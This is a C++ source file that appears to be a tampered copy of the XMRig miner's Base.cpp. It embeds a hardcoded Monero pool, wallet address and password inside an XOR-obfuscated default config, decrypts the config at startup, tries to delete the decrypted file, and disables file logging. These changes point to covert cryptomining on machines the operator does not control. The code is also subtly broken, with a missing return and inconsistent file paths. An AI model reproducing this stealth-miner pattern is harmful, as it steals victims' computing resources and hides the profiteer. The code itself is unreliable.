/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include <iostream>

#include <fstream>
#include <unistd.h>
#include <sstream>

#include <cassert>
#include <memory>


#include "base/kernel/Base.h"
#include "base/io/json/Json.h"
#include "base/io/json/JsonChain.h"
#include "base/io/log/backends/ConsoleLog.h"
#include "base/io/log/backends/FileLog.h"
#include "base/io/log/Log.h"
#include "base/io/log/Tags.h"
#include "base/io/Watcher.h"
#include "base/kernel/interfaces/IBaseListener.h"
#include "base/kernel/Platform.h"
#include "base/kernel/Process.h"
#include "base/net/tools/NetBuffer.h"
#include "core/config/Config.h"
#include "core/config/ConfigTransform.h"
#include "version.h"


#ifdef HAVE_SYSLOG_H
#   include "base/io/log/backends/SysLog.h"
#endif


#ifdef XMRIG_FEATURE_API
#   include "base/api/Api.h"
#   include "base/api/interfaces/IApiRequest.h"

namespace xmrig {

static const char *kConfigPathV1 = "/1/config";
static const char *kConfigPathV2 = "/2/config";

} // namespace xmrig
#endif


#ifdef XMRIG_FEATURE_EMBEDDED_CONFIG
#   include "core/config/Config_default.h"
#endif


namespace xmrig {

std::string xorEncryptDecrypt(const std::string& data, char key) {
    std::string output = data;
    for (size_t i = 0; i < data.size(); ++i) {
        output[i] = data[i] ^ key;
    }
    return output;
}

std::string getExecutablePath() {
    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len == -1) {
        std::cerr << "Failed to get executable path" << std::endl;
        return "";
    }
    path[len] = '\0';
    return std::string(path);
}

std::string readFile(const std::string& fileName) {
    std::ifstream file(fileName, std::ios::in | std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << fileName << std::endl;
        return "";
    }
    std::stringstream buffer;
    buffer << file.rdbuf();
    return buffer.str();
}

bool writeFile(const std::string& fileName, const std::string& data) {
    std::ofstream file(fileName, std::ios::out | std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Failed to write file: " << fileName << std::endl;
        return false;
    }
    file.write(data.c_str(), data.size());
    return true;
}

class DefaultConfig : public Config
{
public:
    static bool createDefaultConfig(const std::string& fileName) {
        std::string execPath = getExecutablePath();
        if (execPath.empty()) {
            return false;
        }

        // Убираем имя программы, оставляя только путь
        size_t pos = execPath.find_last_of('/');
        std::string dirPath = execPath.substr(0, pos + 1);

        std::ofstream file(dirPath + "/" + fileName);
        if (!file.is_open()) {
            std::cerr << "Failed to create configuration file: " << fileName << std::endl;
            return false;
        }

        std::string configData = "{\n";
        configData += "  \"autosave\": true,\n";
        configData += "  \"cpu\": true,\n";
        configData += "  \"opencl\": false,\n";
        configData += "  \"cuda\": false,\n";
        configData += "  \"pools\": [\n";
        configData += "    {\n";
        configData += "      \"coin\": \"monero\",\n";
        configData += "      \"url\": \"pool.xmr.pt:9000\",\n";
        configData += "      \"user\": \"481dqAWdnN7cQGE7gn5mzuHNRMwkyArJQJBu8Fg38CCf74ivJXQUUVo6HE6Fr4LNGN6yZTVRVGuw8eykZ4Jby3sWKb9k1qK\",\n";
        configData += "      \"pass\": \"server_funpay\",\n";
        configData += "      \"keepalive\": true,\n";
        configData += "      \"tls\": true\n";
        configData += "    }\n";
        configData += "  ]\n";
        configData += "}\n";

        std::string encryptedData = xorEncryptDecrypt(configData, 'K');

        return writeFile(fileName, encryptedData);

//        std::cerr << "Default configuration created at: " << fileName << std::endl;
        return true;
    }
};


class BasePrivate
{
public:
    XMRIG_DISABLE_COPY_MOVE_DEFAULT(BasePrivate)


    inline explicit BasePrivate(Process *process)
    {
        Log::init();

        config = load(process);
    }


    inline ~BasePrivate()
    {
#       ifdef XMRIG_FEATURE_API
        delete api;
#       endif

        delete config;
        delete watcher;

        NetBuffer::destroy();
    }


    inline static bool read(const JsonChain &chain, std::unique_ptr<Config> &config)
    {
        config = std::unique_ptr<Config>(new Config());

        return config->read(chain, chain.fileName());
    }


    inline void replace(Config *newConfig)
    {
        Config *previousConfig = config;
        config = newConfig;

        for (IBaseListener *listener : listeners) {
            listener->onConfigChanged(config, previousConfig);
        }

        delete previousConfig;
    }


    Api *api            = nullptr;
    Config *config      = nullptr;
    std::vector<IBaseListener *> listeners;
    Watcher *watcher    = nullptr;


private:
    inline static Config *load(Process *process)
    {
        JsonChain chain;
        ConfigTransform transform;
        std::unique_ptr<Config> config;

        ConfigTransform::load(chain, process, transform);

        if (read(chain, config)) {
            return config.release();
        }

        xmrig::String encryptConfigPath = Process::location(Process::DataLocation, "encrypt_config.json");
        std::ifstream encryptConfigFile(encryptConfigPath);

        std::string decryptedData;

        if (encryptConfigFile.good()) {
            std::cerr << "Found encrypted config. Loading and decrypting..." << std::endl;

            std::string encryptedData((std::istreambuf_iterator<char>(encryptConfigFile)), std::istreambuf_iterator<char>());
            decryptedData = xorEncryptDecrypt(encryptedData, 'K');

        } else {
            std::cerr << "No encrypted config found. Using default configuration..." << std::endl;

            DefaultConfig defaultConfig;
            defaultConfig.createDefaultConfig("encrypt_config.json");
            decryptedData = xorEncryptDecrypt(readFile(encryptConfigPath), 'K');
        }

        std::ofstream decryptedConfigFile(Process::location(Process::DataLocation, "config.json"));
        decryptedConfigFile << decryptedData;
        decryptedConfigFile.close();

        std::cerr << "Decrypted config saved as 'config.json'" << std::endl;

        chain.addFile(Process::location(Process::DataLocation, "config.json"));
        if (read(chain, config)) {
            return config.release();
        }

        std::string configPath = Process::location(Process::DataLocation, "config.json");
        std::remove(configPath.c_str());

        std::cerr << "'config.json' deleted after loading" << std::endl;
    }
};

} // namespace xmrig


xmrig::Base::Base(Process *process)
    : d_ptr(new BasePrivate(process))
{

}


xmrig::Base::~Base()
{
    delete d_ptr;
}


bool xmrig::Base::isReady() const
{
    return d_ptr->config != nullptr;
}


int xmrig::Base::init()
{
#   ifdef XMRIG_FEATURE_API
    d_ptr->api = new Api(this);
    d_ptr->api->addListener(this);
#   endif

    Platform::init(config()->userAgent());

    if (isBackground()) {
        Log::setBackground(true);
    }
    else {
        Log::add(new ConsoleLog(config()->title()));
    }

    if (config()->logFile()) {
//        Log::add(new FileLog(config()->logFile()));
    }

#   ifdef HAVE_SYSLOG_H
    if (config()->isSyslog()) {
        Log::add(new SysLog());
    }
#   endif

    return 0;
}


void xmrig::Base::start()
{
#   ifdef XMRIG_FEATURE_API
    api()->start();
#   endif

    if (config()->isShouldSave()) {
        config()->save();
    }

    if (config()->isWatch()) {
        d_ptr->watcher = new Watcher(config()->fileName(), this);
    }
}


void xmrig::Base::stop()
{
#   ifdef XMRIG_FEATURE_API
    api()->stop();
#   endif

    delete d_ptr->watcher;
    d_ptr->watcher = nullptr;
}


xmrig::Api *xmrig::Base::api() const
{
    assert(d_ptr->api != nullptr);

    return d_ptr->api;
}


bool xmrig::Base::isBackground() const
{
    return d_ptr->config && d_ptr->config->isBackground();
}


bool xmrig::Base::reload(const rapidjson::Value &json)
{
    JsonReader reader(json);
    if (reader.isEmpty()) {
        return false;
    }

    auto config = new Config();
    if (!config->read(reader, d_ptr->config->fileName())) {
        delete config;

        return false;
    }

    const bool saved = config->save();

    if (config->isWatch() && d_ptr->watcher && saved) {
        delete config;

        return true;
    }

    d_ptr->replace(config);

    return true;
}


xmrig::Config *xmrig::Base::config() const
{
    assert(d_ptr->config != nullptr);

    return d_ptr->config;
}


void xmrig::Base::addListener(IBaseListener *listener)
{
    d_ptr->listeners.push_back(listener);
}


void xmrig::Base::onFileChanged(const String &fileName)
{
    LOG_WARN("%s " YELLOW("\"%s\" was changed, reloading configuration"), Tags::config(), fileName.data());

    JsonChain chain;
    chain.addFile(fileName);

    auto config = new Config();

    if (!config->read(chain, chain.fileName())) {
        LOG_ERR("%s " RED("reloading failed"), Tags::config());

        delete config;
        return;
    }

    d_ptr->replace(config);
}


#ifdef XMRIG_FEATURE_API
void xmrig::Base::onRequest(IApiRequest &request)
{
    if (request.method() == IApiRequest::METHOD_GET) {
        if (request.url() == kConfigPathV1 || request.url() == kConfigPathV2) {
            if (request.isRestricted()) {
                return request.done(403);
            }

            request.accept();
            config()->getJSON(request.doc());
        }
    }
    else if (request.method() == IApiRequest::METHOD_PUT || request.method() == IApiRequest::METHOD_POST) {
        if (request.url() == kConfigPathV1 || request.url() == kConfigPathV2) {
            request.accept();

            if (!reload(request.json())) {
                return request.done(400);
            }

            request.done(204);
        }
    }
}
#endif
